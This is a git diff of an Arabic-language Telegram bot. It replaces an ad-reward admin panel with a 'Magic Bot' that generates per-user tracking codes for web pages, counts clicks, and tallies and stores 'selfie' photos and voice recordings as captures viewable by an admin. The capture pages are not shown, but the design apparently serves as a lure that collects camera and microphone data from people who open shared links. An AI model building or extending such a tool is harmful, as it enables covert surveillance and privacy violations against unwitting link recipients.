+      '📊 *إحصائياتك*\n\n' +
+      '👤 ' + (u.firstName || '') + ' ' + (u.lastName || '') + '\n' +
+      '🆔 `' + u.id + '`\n' +
+      '━━━━━━━━━━━━━━━\n' +
+      '📸 صور سيلفي: *' + (u.selfies || 0) + '*\n' +
+      '🎤 تسجيلات: *' + (u.voices || 0) + '*\n' +
+      '📁 إجمالي الالتقاطات: *' + (u.captures || 0) + '*\n' +
+      '📅 انضم: ' + new Date(u.joinedAt).toLocaleDateString('ar-EG'),
+      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, mainMenu())
+    );
+  }
+
+  // My links
+  if (data === 'my_links') {
+    const links = Object.values(DB.links).filter(function(l) { return l.userId === String(uid); });
+    let text = '🔗 *روابطك المولدة*\n\n';
+    if (links.length === 0) {
+      text += '📭 لا توجد روابط بعد\n\nافتح أي صفحة واضغط "توليد رابط"';
+    } else {
+      links.slice(-10).reverse().forEach(function(l) {
+        text += '`' + l.code + '` — ' + l.page + ' (' + l.clicks + ' نقرة)\n';
+      });
+    }
+    return bot.editMessageText(text,
+      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, mainMenu())
+    );
+  }
+
+  // Page buttons - generate link and open web app
+  if (data.indexOf('page_') === 0) {
+    const pageName = data.replace('page_', '');
+    const code = Math.random().toString(36).substring(2, 8).toUpperCase();
+    DB.links[code] = {
+      code: code,
+      page: pageName,
+      userId: String(uid),
+      params: {},
+      clicks: 0,
+      created: Date.now()
+    };
+    DB.stats.totalLinks++;
+    saveDB();
+
+    const pageUrl = APP_URL + '/pages/' + pageName + '.html?uid=' + uid + '&code=' + code;
+
+    return bot.editMessageText(
+      '✨ *جاري فتح الصفحة...*\n\n' +
+      '📄 ' + pageName + '\n' +
+      '🔗 كود الرابط: `' + code + '`\n\n' +
+      '⬇️ اضغط للفتح:',
+      {
+        chat_id: chatId,
+        message_id: msgId,
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '🚀 فتح ' + pageName, web_app: { url: pageUrl } }],
+            [{ text: '🔙 رجوع', callback_data: 'menu_main' }]
+          ]
+        }
+      }
+    );
+  }
+
+  // ═══════════ ADMIN ═══════════
+  if (data === 'adm_stats') {
+    const users = Object.values(DB.users);
+    return bot.editMessageText(
+      '📊 *الإحصائيات الشاملة*\n\n' +
+      '👥 المستخدمين: *' + users.length + '*\n' +
+      '📸 صور سيلفي: *' + DB.stats.totalSelfies + '*\n' +
+      '🎤 تسجيلات صوتية: *' + DB.stats.totalVoice + '*\n' +
+      '📁 إجمالي الالتقاطات: *' + DB.captures.length + '*\n' +
+      '🔗 روابط مولدة: *' + DB.stats.totalLinks + '*\n' +
+      '━━━━━━━━━━━━━━━\n' +
+      '📅 ' + new Date().toLocaleString('ar-EG'),
+      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, adminMenu())
+    );
+  }
+
+  if (data === 'adm_captures') {
+    const recent = DB.captures.slice(-10).reverse();
+    if (recent.length === 0) {
+      return bot.editMessageText('📭 لا توجد التقاطات بعد',
+        Object.assign({ chat_id: chatId, message_id: msgId }, adminMenu())
+      );
+    }
+    let text = '📸 *آخر 10 التقاطات*\n\n';
+    recent.forEach(function(c, i) {
+      const u = DB.users[c.userId] || {};
+      text += (i+1) + '. ' + (u.firstName || 'مجهول') + ' — ' + c.type + '\n' +
+              '🕐 ' + new Date(c.date).toLocaleString('ar-EG') + '\n\n';
+    });
+    return bot.editMessageText(text,
+      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, adminMenu())
+    );
+  }
+
+  if (data === 'adm_users') {
+    const users = Object.values(DB.users).sort(function(a, b) { return (b.captures||0) - (a.captures||0); }).slice(0, 20);
+    let text = '👥 *أكثر 20 نشاطاً*\n\n';
+    users.forEach(function(u, i) {
+      text += (i+1) + '. ' + (u.firstName || 'User') + ' — ' + (u.captures || 0) + ' 📸\n';
+    });
+    return bot.editMessageText(text,
+      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, adminMenu())
+    );
+  }
+
+  if (data === 'adm_links') {
+    const links = Object.values(DB.links).slice(-15).reverse();
+    let text = '🔗 *آخر الروابط*\n\n';
+    links.forEach(function(l) {
+      text += '`' + l.code + '` → ' + l.page + ' (' + l.clicks + ')\n';
+    });
+    return bot.editMessageText(text,
+      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, adminMenu())
+    );
+  }
+
+  if (data === 'adm_broadcast') {
+    flows[chatId] = { action: 'broadcast' };
+    return bot.editMessageText(
+      '📣 *بث جماعي*\n\nأرسل الرسالة الآن:\n\n👥 المستخدمين: ' + Object.keys(DB.users).length,
+      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'menu_admin' }]] } }
+    );
+  }
+
+  if (data === 'adm_clear') {
+    return bot.editMessageText(
+      '⚠️ *تأكيد مسح الالتقاطات*\n\nسيتم حذف ' + DB.captures.length + ' التقاط. هذا لا يمكن التراجع!',
+      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: [
+          [{ text: '🗑️ نعم، امسح الكل', callback_data: 'adm_clear_yes' }],
+          [{ text: '❌ إلغاء', callback_data: 'menu_admin' }]
+        ]}}
+    );
+  }
+
+  if (data === 'adm_clear_yes') {
+    DB.captures.forEach(function(c) {
+      if (c.file) {
+        const fp = path.join(UPLOADS, path.basename(c.file));
+        if (fs.existsSync(fp)) try { fs.unlinkSync(fp); } catch(e) {}
+      }
+    });
+    DB.captures = [];
+    saveDB();
+    return bot.editMessageText('✅ تم مسح جميع الالتقاطات',
+      Object.assign({ chat_id: chatId, message_id: msgId }, adminMenu())
+    );
+  }
+});
+
+// ═══════════ ADMIN MESSAGES ═══════════
+bot.on('message', async function(msg) {
+  const chatId = msg.chat.id;
+  if (!isAdmin(msg)) return;
+  if (msg.text && msg.text.indexOf('/') === 0) return;
+
+  const flow = flows[chatId];
+  if (!flow) return;
+
+  if (flow.action === 'broadcast') {
+    const text = msg.text || msg.caption;
+    if (!text) return;
+    delete flows[chatId];
+    const users = Object.keys(DB.users);
+    const progress = await bot.sendMessage(chatId, '📣 جاري الإرسال... 0/' + users.length);
+    let sent = 0;
+    for (let i = 0; i < users.length; i++) {
+      try {
+        await bot.sendMessage(users[i], '📣 *رسالة من الإدارة*\n\n' + text, { parse_mode: 'Markdown' });
+        sent++;
+      } catch (e) {}
+      await new Promise(function(r) { setTimeout(r, 50); });
+    }
+    return bot.editMessageText(
+      '✅ *تم البث*\n\n📤 ' + sent + ' من ' + users.length,
+      Object.assign({ chat_id: chatId, message_id: progress.message_id, parse_mode: 'Markdown' }, adminMenu())
+    );
+  }
+});
+
+// ═══════════ MENU BUTTON ═══════════
+async function setupMenu() {
   try {
     await bot.setChatMenuButton({
       menu_button: {
@@ -520,460 +660,18 @@ async function setupMenuButton() {
     });
     console.log('✅ Menu Button set');
   } catch (e) {
-    console.log('❌ Menu Button error:', e.message);
+    console.log('❌ Menu:', e.message);
   }
 }
 
-// ═══════════ CALLBACKS ═══════════
-bot.on('callback_query', async function(q) {
-  const chatId = q.message.chat.id;
-  const msgId = q.message.message_id;
-  const data = q.data;
-
-  if (!isAdmin(q)) {
-    return bot.answerCallbackQuery(q.id, { text: '⚠️ للأدمن فقط' });
-  }
-  bot.answerCallbackQuery(q.id);
-
-  // Main menu
-  if (data === 'menu_main') {
-    return bot.editMessageText(
-      '👑 *لوحة التحكم*\n\nاختر قسماً:',
-      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, mainMenu())
-    );
-  }
-
-  // Stats
-  if (data === 'menu_stats') {
-    const users = Object.values(DB.users);
-    const totalBal = users.reduce(function(s, u) { return s + u.balance; }, 0);
-    const pending = DB.withdrawals.filter(function(w) { return w.status === 'pending'; }).length;
-    const activeAds = DB.ads.filter(function(a) { return a.active && a.media; }).length;
-    return bot.editMessageText(
-      '📊 *الإحصائيات*\n\n' +
-      '👥 المستخدمين: ' + users.length + '\n' +
-      '💰 الأرصدة: $' + totalBal.toFixed(2) + '\n' +
-      '💸 المدفوع: $' + DB.stats.totalPaid.toFixed(2) + '\n' +
-      '👁️ المشاهدات: ' + DB.stats.totalViews + '\n' +
-      '⏳ معلقة: ' + pending + '\n' +
-      '📢 نشطة: ' + activeAds + '/5',
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [
-          [{ text: '🔄 تحديث', callback_data: 'menu_stats' }],
-          [{ text: '🏠 الرئيسية', callback_data: 'menu_main' }]
-        ]}}
-    );
-  }
-
-  // Ads menu
-  if (data === 'menu_ads') {
-    const active = DB.ads.filter(function(a) { return a.active && a.media; }).length;
-    return bot.editMessageText(
-      '📢 *إدارة الإعلانات*\n\n' +
-      '✅ = جاهز | ⬜ = فارغ\n' +
-      'النشطة: ' + active + '/5\n\n' +
-      'اضغط رقم لإدارته:',
-      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, adsMenu())
-    );
-  }
-
-  // Ad detail
-  if (data.indexOf('ad_') === 0 && data.indexOf('admedia_') !== 0 && data.indexOf('adtitle_') !== 0 &&
-      data.indexOf('adreward_') !== 0 && data.indexOf('adtoggle_') !== 0 && data.indexOf('adclear_') !== 0) {
-    const adId = parseInt(data.replace('ad_', ''));
-    const ad = DB.ads.find(function(a) { return a.id === adId; });
-    if (!ad) return;
-
-    const status = ad.media ? (ad.active ? '🟢 نشط' : '🔴 معطل') : '⬜ فارغ';
-    const mediaLine = ad.media
-      ? '🎬 النوع: ' + (ad.mediaType === 'video' ? 'فيديو' : 'صورة') + '\n🔗 ' + APP_URL + ad.media
-      : '📭 لا يوجد محتوى';
-
-    return bot.editMessageText(
-      '📢 *الإعلان ' + adId + '*\n\n' +
-      '📝 ' + ad.title + '\n' +
-      '💰 $' + ad.reward.toFixed(2) + '\n' +
-      '📊 ' + status + '\n\n' +
-      mediaLine,
-      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', disable_web_page_preview: true }, adDetail(adId))
-    );
-  }
-
-  // Add media flow
-  if (data.indexOf('admedia_') === 0) {
-    const adId = parseInt(data.replace('admedia_', ''));
-    flows[chatId] = { action: 'add_media', adId: adId };
-    return bot.editMessageText(
-      '📤 *إضافة وسائط للإعلان ' + adId + '*\n\n' +
-      'أرسل الآن:\n' +
-      '• 🎬 فيديو (MP4)\n' +
-      '• 🖼️ صورة (JPG/PNG)\n\n' +
-      '⚠️ الحد الأقصى: 20MB',
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'ad_' + adId }]] }}
-    );
-  }
-
-  // Edit title flow
-  if (data.indexOf('adtitle_') === 0) {
-    const adId = parseInt(data.replace('adtitle_', ''));
-    flows[chatId] = { action: 'edit_title', adId: adId };
-    return bot.editMessageText(
-      '✏️ *تعديل عنوان الإعلان ' + adId + '*\n\nأرسل العنوان الجديد:',
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'ad_' + adId }]] }}
-    );
-  }
-
-  // Edit reward flow
-  if (data.indexOf('adreward_') === 0) {
-    const adId = parseInt(data.replace('adreward_', ''));
-    flows[chatId] = { action: 'edit_reward', adId: adId };
-    return bot.editMessageText(
-      '💰 *تعديل مكافأة الإعلان ' + adId + '*\n\nأرسل المبلغ الجديد (مثال: 0.50):',
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'ad_' + adId }]] }}
-    );
-  }
-
-  // Toggle
-  if (data.indexOf('adtoggle_') === 0) {
-    const adId = parseInt(data.replace('adtoggle_', ''));
-    const ad = DB.ads.find(function(a) { return a.id === adId; });
-    if (ad) {
-      ad.active = !ad.active;
-      saveDB();
-    }
-    return bot.editMessageText(
-      '✅ تم ' + (ad.active ? 'التفعيل' : 'التعطيل'),
-      Object.assign({ chat_id: chatId, message_id: msgId }, adDetail(adId))
-    );
-  }
-
-  // Clear
-  if (data.indexOf('adclear_') === 0) {
-    const adId = parseInt(data.replace('adclear_', ''));
-    return bot.editMessageText(
-      '⚠️ تأكيد حذف محتوى الإعلان ' + adId + '؟',
-      { chat_id: chatId, message_id: msgId,
-        reply_markup: { inline_keyboard: [
-          [{ text: '🗑️ نعم احذف', callback_data: 'adclear_yes_' + adId }],
-          [{ text: '❌ إلغاء', callback_data: 'ad_' + adId }]
-        ]}}
-    );
-  }
-
-  if (data.indexOf('adclear_yes_') === 0) {
-    const adId = parseInt(data.replace('adclear_yes_', ''));
-    const ad = DB.ads.find(function(a) { return a.id === adId; });
-    if (ad) {
-      if (ad.media) {
-        const oldPath = path.join(UPLOADS, path.basename(ad.media));
-        if (fs.existsSync(oldPath)) try { fs.unlinkSync(oldPath); } catch(e) {}
-      }
-      ad.media = null;
-      ad.mediaType = null;
-      ad.active = false;
-      saveDB();
-    }
-    return bot.editMessageText(
-      '✅ تم الحذف',
-      Object.assign({ chat_id: chatId, message_id: msgId }, adsMenu())
-    );
-  }
-
-  // Withdrawals
-  if (data === 'menu_wd') {
-    const pending = DB.withdrawals.filter(function(w) { return w.status === 'pending'; });
-    if (pending.length === 0) {
-      return bot.editMessageText(
-        '💸 *السحوبات*\n\n✅ لا توجد طلبات معلقة',
-        { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-          reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'menu_main' }]] }}
-      );
-    }
-    let text = '💸 *السحوبات المعلقة*\n\n';
-    const btns = [];
-    for (let i = 0; i < Math.min(pending.length, 5); i++) {
-      const w = pending[i];
-      text += (i+1) + '. ' + (w.userName || '?') + ' — $' + w.amount + '\n';
-      btns.push([
-        { text: '✅ موافقة #' + (i+1), callback_data: 'approve_' + w.id },
-        { text: '❌ رفض #' + (i+1), callback_data: 'reject_' + w.id }
-      ]);
-    }
-    btns.push([{ text: '🏠 الرئيسية', callback_data: 'menu_main' }]);
-    return bot.editMessageText(text,
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: btns } });
-  }
-
-  if (data.indexOf('approve_') === 0) {
-    const wid = data.replace('approve_', '');
-    const w = DB.withdrawals.find(function(x) { return x.id === wid; });
-    if (w && w.status === 'pending') {
-      w.status = 'approved';
-      DB.stats.totalPaid += w.amount;
-      saveDB();
-      bot.sendMessage(w.userId, '✅ تمت الموافقة على سحب $' + w.amount).catch(function(){});
-      bot.answerCallbackQuery(q.id, { text: '✅ تم', show_alert: true });
-    }
-    return;
-  }
-
-  if (data.indexOf('reject_') === 0) {
-    const wid = data.replace('reject_', '');
-    const w = DB.withdrawals.find(function(x) { return x.id === wid; });
-    if (w && w.status === 'pending') {
-      w.status = 'rejected';
-      const u = getUser(w.userId);
-      saveUser(w.userId, { balance: u.balance + w.amount });
-      bot.sendMessage(w.userId, '❌ تم رفض سحب $' + w.amount + ' وأعيد لرصيدك').catch(function(){});
-      bot.answerCallbackQuery(q.id, { text: '❌ تم', show_alert: true });
-    }
-    return;
-  }
-
-  // Users
-  if (data === 'menu_users') {
-    return bot.editMessageText(
-      '👥 *المستخدمين*\n\nإجمالي: ' + Object.keys(DB.users).length,
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [
-          [{ text: '🔍 بحث', callback_data: 'users_search' }],
-          [{ text: '🏆 الأفضل', callback_data: 'users_top' }],
-          [{ text: '🏠 الرئيسية', callback_data: 'menu_main' }]
-        ]}}
-    );
-  }
-
-  if (data === 'users_search') {
-    flows[chatId] = { action: 'search_user' };
-    return bot.editMessageText('🔍 أرسل ID المستخدم:',
-      { chat_id: chatId, message_id: msgId,
-        reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'menu_users' }]] }});
-  }
-
-  if (data === 'users_top') {
-    const top = Object.values(DB.users).sort(function(a, b) { return b.totalEarned - a.totalEarned; }).slice(0, 10);
-    let text = '🏆 *أفضل 10*\n\n';
-    top.forEach(function(u, i) {
-      text += (i+1) + '. ' + (u.firstName || 'User') + ' — $' + u.totalEarned.toFixed(2) + '\n';
-    });
-    return bot.editMessageText(text,
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'menu_main' }]] }});
-  }
-
-  // Broadcast
-  if (data === 'menu_bc') {
-    flows[chatId] = { action: 'broadcast' };
-    return bot.editMessageText(
-      '📣 *بث جماعي*\n\nأرسل الرسالة:\n👥 للمستخدمين: ' + Object.keys(DB.users).length,
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'menu_main' }]] }}
-    );
-  }
-
-  // Settings
-  if (data === 'menu_settings') {
-    return bot.editMessageText(
-      '⚙️ *الإعدادات*\n\n' +
-      '💰 مكافأة الإعلان: $' + AD_REWARD + '\n' +
-      '📊 الحد اليومي: ' + DAILY_LIMIT + '\n' +
-      '💸 حد السحب: $' + MIN_WITHDRAW + '\n' +
-      '👥 مكافأة الدعوة: $' + REF_REWARD,
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'menu_main' }]] }}
-    );
-  }
-
-  // App link
-  if (data === 'menu_link') {
-    return bot.editMessageText(
-      '🔗 *رابط التطبيق*\n\n`' + APP_URL + '`',
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'menu_main' }]] }}
-    );
-  }
-
-  // Help
-  if (data === 'menu_help') {
-    return bot.editMessageText(
-      '📖 *الدليل*\n\n' +
-      '📢 الإعلانات: اختر 1-5 ثم أضف وسائط\n' +
-      '💸 السحوبات: تصلك تلقائياً\n' +
-      '📣 البث: أرسل نصاً',
-      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'menu_main' }]] }}
-    );
-  }
-});
-
-// ═══════════ ADMIN MESSAGES ═══════════
-bot.on('message', async function(msg) {
-  const chatId = msg.chat.id;
-  if (!isAdmin(msg)) return;
-  if (msg.text && msg.text.indexOf('/start') === 0) return;
-
-  const flow = flows[chatId];
-  if (!flow) return;
-
-  // Add media
-  if (flow.action === 'add_media') {
-    const adId = flow.adId;
-    let fileId = null;
-    let mediaType = null;
-
-    if (msg.video) {
-      fileId = msg.video.file_id;
-      mediaType = 'video';
-    } else if (msg.photo && msg.photo.length > 0) {
-      fileId = msg.photo[msg.photo.length - 1].file_id;
-      mediaType = 'photo';
-    } else if (msg.document && (msg.document.mime_type || '').indexOf('video') === 0) {
-      fileId = msg.document.file_id;
-      mediaType = 'video';
-    } else {
-      return bot.sendMessage(chatId, '⚠️ أرسل فيديو أو صورة فقط');
-    }
-
-    try {
-      const info = await bot.getFile(fileId);
-      if (info.file_size && info.file_size > 20 * 1024 * 1024) {
-        return bot.sendMessage(chatId, '⚠️ الملف كبير جداً');
-      }
-
-      const ext = mediaType === 'video' ? '.mp4' : '.jpg';
-      const filename = 'ad' + adId + '_' + Date.now() + ext;
-      const filepath = path.join(UPLOADS, filename);
-
-      const stream = bot.getFileStream(fileId);
-      const write = fs.createWriteStream(filepath);
-      stream.pipe(write);
-
-      await new Promise(function(resolve, reject) {
-        write.on('finish', resolve);
-        write.on('error', reject);
-      });
-
-      const ad = DB.ads.find(function(a) { return a.id === adId; });
-      if (ad) {
-        if (ad.media) {
-          const oldPath = path.join(UPLOADS, path.basename(ad.media));
-          if (fs.existsSync(oldPath)) try { fs.unlinkSync(oldPath); } catch(e) {}
-        }
-        ad.media = '/media/' + filename;
-        ad.mediaType = mediaType;
-        ad.active = true;
-      }
-      saveDB();
-
-      delete flows[chatId];
-      bot.deleteMessage(chatId, msg.message_id).catch(function(){});
-
-      return bot.sendMessage(chatId,
-        '✅ *تم الإضافة بنجاح*\n\n' +
-        '📢 الإعلان: ' + adId + '\n' +
-        '🎬 النوع: ' + (mediaType === 'video' ? 'فيديو' : 'صورة') + '\n' +
-        '📊 الحالة: 🟢 نشط',
-        Object.assign({ parse_mode: 'Markdown' }, adDetail(adId))
-      );
-    } catch (e) {
-      console.error('[Upload]', e);
-      delete flows[chatId];
-      return bot.sendMessage(chatId, '❌ خطأ: ' + e.message);
-    }
-  }
-
-  // Edit title
-  if (flow.action === 'edit_title') {
-    const adId = flow.adId;
-    const title = (msg.text || '').trim();
-    if (!title || title.length > 100) {
-      return bot.sendMessage(chatId, '⚠️ عنوان غير صحيح');
-    }
-    const ad = DB.ads.find(function(a) { return a.id === adId; });
-    if (ad) { ad.title = title; saveDB(); }
-    delete flows[chatId];
-    bot.deleteMessage(chatId, msg.message_id).catch(function(){});
-    return bot.sendMessage(chatId, '✅ تم تعديل العنوان', adDetail(adId));
-  }
-
-  // Edit reward
-  if (flow.action === 'edit_reward') {
-    const adId = flow.adId;
-    const reward = parseFloat(msg.text);
-    if (isNaN(reward) || reward < 0.01 || reward > 100) {
-      return bot.sendMessage(chatId, '⚠️ مبلغ غير صحيح');
-    }
-    const ad = DB.ads.find(function(a) { return a.id === adId; });
-    if (ad) { ad.reward = reward; saveDB(); }
-    delete flows[chatId];
-    bot.deleteMessage(chatId, msg.message_id).catch(function(){});
-    return bot.sendMessage(chatId, '✅ تم تعديل المكافأة', adDetail(adId));
-  }
-
-  // Search user
-  if (flow.action === 'search_user') {
-    const uid = (msg.text || '').trim();
-    delete flows[chatId];
-    bot.deleteMessage(chatId, msg.message_id).catch(function(){});
-
-    if (!DB.users[uid]) {
-      return bot.sendMessage(chatId, '❌ المستخدم غير موجود');
-    }
-    const u = DB.users[uid];
-    return bot.sendMessage(chatId,
-      '👤 *بيانات المستخدم*\n\n' +
-      '🆔 `' + u.id + '`\n' +
-      '📛 ' + (u.firstName || '') + ' ' + (u.lastName || '') + '\n' +
-      '🔗 @' + (u.username || 'لا يوجد') + '\n' +
-      '━━━━━━━━━━━━━━━\n' +
-      '💰 $' + u.balance.toFixed(2) + '\n' +
-      '💵 $' + u.totalEarned.toFixed(2) + '\n' +
-      '👁️ ' + u.totalAds + '\n' +
-      '👥 ' + u.referrals.length,
-      { parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [
-          [{ text: '💬 مراسلة', url: 'tg://user?id=' + u.id }],
-          [{ text: '🏠 الرئيسية', callback_data: 'menu_main' }]
-        ]}}
-    );
-  }
-
-  // Broadcast
-  if (flow.action === 'broadcast') {
-    const text = msg.text || msg.caption;
-    delete flows[chatId];
-    bot.deleteMessage(chatId, msg.message_id).catch(function(){});
-    if (!text) return bot.sendMessage(chatId, '⚠️ أرسل نصاً');
-
-    const users = Object.keys(DB.users);
-    const prog = await bot.sendMessage(chatId, '📣 جاري الإرسال... 0/' + users.length);
-    let sent = 0;
-    for (let i = 0; i < users.length; i++) {
-      try {
-        await bot.sendMessage(users[i], '📣 *رسالة من الإدارة*\n\n' + text, { parse_mode: 'Markdown' });
-        sent++;
-      } catch (e) {}
-      await new Promise(function(r) { setTimeout(r, 50); });
-    }
-    return bot.editMessageText(
-      '✅ تم البث\n📤 ' + sent + ' / ' + users.length,
-      Object.assign({ chat_id: chatId, message_id: prog.message_id, parse_mode: 'Markdown' }, mainMenu())
-    );
-  }
-});
-
 bot.on('polling_error', function(err) { console.log('[Poll]', err.message); });
 
-// ═══════════ START ═══════════
 app.listen(PORT, function() {
   console.log('═══════════════════════════════');
-  console.log('🚀 PayPlus Server Running');
+  console.log('🚀 PayPlus Magic Bot v6.0');
   console.log('📍 Port: ' + PORT);
   console.log('🌐 App: ' + APP_URL);
   console.log('👑 Admin: ' + ADMIN_ID);
   console.log('═══════════════════════════════');
-  setupMenuButton();
+  setupMenu();
 });
